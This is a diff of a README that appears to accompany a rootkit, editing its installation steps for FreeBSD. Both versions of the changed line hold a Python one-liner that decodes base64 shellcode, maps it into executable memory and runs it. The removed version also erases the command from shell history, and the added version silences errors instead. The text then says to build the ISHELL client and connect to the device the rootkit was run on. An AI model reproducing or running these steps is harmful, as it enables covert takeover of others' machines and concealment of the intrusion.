@@ -14,10 +14,8 @@ python3 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp9////0iNBe
 With FreeBSD, it will depend on the version of python installed and if history is enabled. If history is not enabled and you have python3.11 you can just use this:
 
 ```
-python3.11 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp+P///0iNBe////9Iu67h2fdth+YDSDFYJ0gt+P///+L05tALH0+H5gOBibaaCKiWa53Sq9gZ7pJsgaiKvyjLqi7Y0ffEQu6Va8rhhqU6z2/l5tAZv+5P3Qyr4dn3bYfmAw=="; shellcode = base64.b64decode(encoded_shellcode); mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC); mem.write(shellcode); addr = ctypes.addressof(ctypes.c_char.from_buffer(mem)); shell_func = ctypes.CFUNCTYPE(None)(addr); print("...and I will not have to send a second."); shell_func()' && history -d $(history | awk 'END { print $1 }')
+python3.11 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp+P///0iNBe////9Iu67h2fdth+YDSDFYJ0gt+P///+L05tALH0+H5gOBibaaCKiWa53Sq9gZ7pJsgaiKvyjLqi7Y0ffEQu6Va8rhhqU6z2/l5tAZv+5P3Qyr4dn3bYfmAw=="; shellcode = base64.b64decode(encoded_shellcode); mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC); mem.write(shellcode); addr = ctypes.addressof(ctypes.c_char.from_buffer(mem)); shell_func = ctypes.CFUNCTYPE(None)(addr); print("...and I will not have to send a second."); shell_func()' 2>/dev/null
 ``` 
-
-Should you see errors like ```/bin/sh: history: not found```, it just means that the history command was never set up properly on that device. 
 
 From there you may go into the ISHELL-v0.3 folder and type 'make linux' or 'make bsd' to build ish. Then you may run ish with the ip of the device the rootkit was ran on to connect.
 
